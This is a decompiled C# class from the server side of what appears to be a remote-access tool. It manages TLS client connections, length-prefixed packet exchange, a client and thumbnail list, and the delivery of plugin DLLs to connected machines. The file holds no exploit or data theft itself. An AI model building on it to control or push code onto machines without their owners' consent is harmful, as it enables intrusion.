using System;
using System.Drawing;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;
using Server.Algorithm;
using Server.Handle_Packet;
using Server.MessagePack;

namespace Server.Connection
{
	// Token: 0x02000012 RID: 18
	public class Clients
	{
		// Token: 0x17000006 RID: 6
		// (get) Token: 0x0600007A RID: 122 RVA: 0x0000A2D8 File Offset: 0x000084D8
		// (set) Token: 0x0600007B RID: 123 RVA: 0x0000A2E0 File Offset: 0x000084E0
		public Socket TcpClient { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x0600007C RID: 124 RVA: 0x0000A2E9 File Offset: 0x000084E9
		// (set) Token: 0x0600007D RID: 125 RVA: 0x0000A2F1 File Offset: 0x000084F1
		public SslStream SslClient { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x0600007E RID: 126 RVA: 0x0000A2FA File Offset: 0x000084FA
		// (set) Token: 0x0600007F RID: 127 RVA: 0x0000A302 File Offset: 0x00008502
		public ListViewItem LV { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000080 RID: 128 RVA: 0x0000A30B File Offset: 0x0000850B
		// (set) Token: 0x06000081 RID: 129 RVA: 0x0000A313 File Offset: 0x00008513
		public ListViewItem LV2 { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000082 RID: 130 RVA: 0x0000A31C File Offset: 0x0000851C
		// (set) Token: 0x06000083 RID: 131 RVA: 0x0000A324 File Offset: 0x00008524
		public string ID { get; set; }

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000084 RID: 132 RVA: 0x0000A32D File Offset: 0x0000852D
		// (set) Token: 0x06000085 RID: 133 RVA: 0x0000A335 File Offset: 0x00008535
		private byte[] ClientBuffer { get; set; }

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000086 RID: 134 RVA: 0x0000A33E File Offset: 0x0000853E
		// (set) Token: 0x06000087 RID: 135 RVA: 0x0000A346 File Offset: 0x00008546
		private long HeaderSize { get; set; }

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x06000088 RID: 136 RVA: 0x0000A34F File Offset: 0x0000854F
		// (set) Token: 0x06000089 RID: 137 RVA: 0x0000A357 File Offset: 0x00008557
		private long Offset { get; set; }

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x0600008A RID: 138 RVA: 0x0000A360 File Offset: 0x00008560
		// (set) Token: 0x0600008B RID: 139 RVA: 0x0000A368 File Offset: 0x00008568
		private bool ClientBufferRecevied { get; set; }

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x0600008C RID: 140 RVA: 0x0000A371 File Offset: 0x00008571
		// (set) Token: 0x0600008D RID: 141 RVA: 0x0000A379 File Offset: 0x00008579
		public object SendSync { get; set; }

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x0600008E RID: 142 RVA: 0x0000A382 File Offset: 0x00008582
		// (set) Token: 0x0600008F RID: 143 RVA: 0x0000A38A File Offset: 0x0000858A
		public long BytesRecevied { get; set; }

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000090 RID: 144 RVA: 0x0000A393 File Offset: 0x00008593
		// (set) Token: 0x06000091 RID: 145 RVA: 0x0000A39B File Offset: 0x0000859B
		public string Ip { get; set; }

		// Token: 0x06000092 RID: 146 RVA: 0x0000A3A4 File Offset: 0x000085A4
		public Clients(Socket socket)
		{
			this.SendSync = new object();
			this.TcpClient = socket;
			this.Ip = this.TcpClient.RemoteEndPoint.ToString().Split(new char[]
			{
				':'
			})[0];
			this.SslClient = new SslStream(new NetworkStream(this.TcpClient, true), false);
			this.SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, new AsyncCallback(this.EndAuthenticate), null);
		}

		// Token: 0x06000093 RID: 147 RVA: 0x0000A430 File Offset: 0x00008630
		private void EndAuthenticate(IAsyncResult ar)
		{
			try
			{
				this.SslClient.EndAuthenticateAsServer(ar);
				this.Offset = 0L;
				this.HeaderSize = 4L;
				this.ClientBuffer = new byte[this.HeaderSize];
				this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
			}
			catch
			{
				SslStream sslClient = this.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = this.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
		}

		// Token: 0x06000094 RID: 148 RVA: 0x0000A4D0 File Offset: 0x000086D0
		public void ReadClientData(IAsyncResult ar)
		{
			try
			{
				if (!this.TcpClient.Connected)
				{
					this.Disconnected();
				}
				else
				{
					int num = this.SslClient.EndRead(ar);
					if (num > 0)
					{
						this.HeaderSize -= (long)num;
						this.Offset += (long)num;
						if (!this.ClientBufferRecevied)
						{
							if (this.HeaderSize == 0L)
							{
								this.HeaderSize = (long)BitConverter.ToInt32(this.ClientBuffer, 0);
								if (this.HeaderSize > 0L)
								{
									this.ClientBuffer = new byte[this.HeaderSize];
									this.Offset = 0L;
									this.ClientBufferRecevied = true;
								}
							}
							else if (this.HeaderSize < 0L)
							{
								this.Disconnected();
								return;
							}
						}
						else
						{
							object lockReceivedSendValue = Settings.LockReceivedSendValue;
							lock (lockReceivedSendValue)
							{
								Settings.ReceivedValue += (long)num;
							}
							this.BytesRecevied += (long)num;
							if (this.HeaderSize == 0L)
							{
								ThreadPool.QueueUserWorkItem(new WaitCallback(new Packet
								{
									client = this,
									data = this.ClientBuffer
								}.Read), null);
								this.Offset = 0L;
								this.HeaderSize = 4L;
								this.ClientBuffer = new byte[this.HeaderSize];
								this.ClientBufferRecevied = false;
							}
							else if (this.HeaderSize < 0L)
							{
								this.Disconnected();
								return;
							}
						}
						this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
					}
					else
					{
						this.Disconnected();
					}
				}
			}
			catch
			{
				this.Disconnected();
			}
		}

		// Token: 0x06000095 RID: 149 RVA: 0x0000A6B0 File Offset: 0x000088B0
		public void Disconnected()
		{
			if (this.LV != null)
			{
				Program.form1.Invoke(new MethodInvoker(delegate()
				{
					try
					{
						object obj = Settings.LockListviewClients;
						lock (obj)
						{
							this.LV.Remove();
						}
						if (this.LV2 != null)
						{
							obj = Settings.LockListviewThumb;
							lock (obj)
							{
								this.LV2.Remove();
							}
						}
					}
					catch
					{
					}
					new HandleLogs().Addmsg("Client " + this.Ip + " disconnected", Color.Red);
				}));
			}
			try
			{
				SslStream sslClient = this.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = this.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000096 RID: 150 RVA: 0x0000A714 File Offset: 0x00008914
		public void Send(object msg)
		{
			object sendSync = this.SendSync;
			lock (sendSync)
			{
				try
				{
					if (!this.TcpClient.Connected)
					{
						this.Disconnected();
					}
					else if ((byte[])msg != null)
					{
						byte[] array = (byte[])msg;
						byte[] bytes = BitConverter.GetBytes(array.Length);
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.SslClient.Write(bytes, 0, bytes.Length);
						object lockReceivedSendValue;
						if (array.Length > 1000000)
						{
							using (MemoryStream memoryStream = new MemoryStream(array))
							{
								memoryStream.Position = 0L;
								byte[] array2 = new byte[50000];
								int num;
								while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
								{
									this.TcpClient.Poll(-1, SelectMode.SelectWrite);
									this.SslClient.Write(array2, 0, num);
									this.SslClient.Flush();
									lockReceivedSendValue = Settings.LockReceivedSendValue;
									lock (lockReceivedSendValue)
									{
										Settings.SentValue += (long)num;
									}
								}
								goto IL_166;
							}
						}
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.SslClient.Write(array, 0, array.Length);
						this.SslClient.Flush();
						lockReceivedSendValue = Settings.LockReceivedSendValue;
						lock (lockReceivedSendValue)
						{
							Settings.SentValue += (long)array.Length;
						}
						IL_166:;
					}
				}
				catch
				{
					this.Disconnected();
				}
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x0000A918 File Offset: 0x00008B18
		public void SendPlugin(string hash)
		{
			try
			{
				foreach (string text in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
				{
					if (hash == GetHash.GetChecksum(text))
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
						msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(text)));
						msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text));
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Send), msgPack.Encode2Bytes());
						new HandleLogs().Addmsg("Plugin " + Path.GetFileName(text) + " sent to client " + this.Ip, Color.Blue);
						break;
					}
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg("Client " + this.Ip + " " + ex.Message, Color.Red);
			}
		}
	}
}
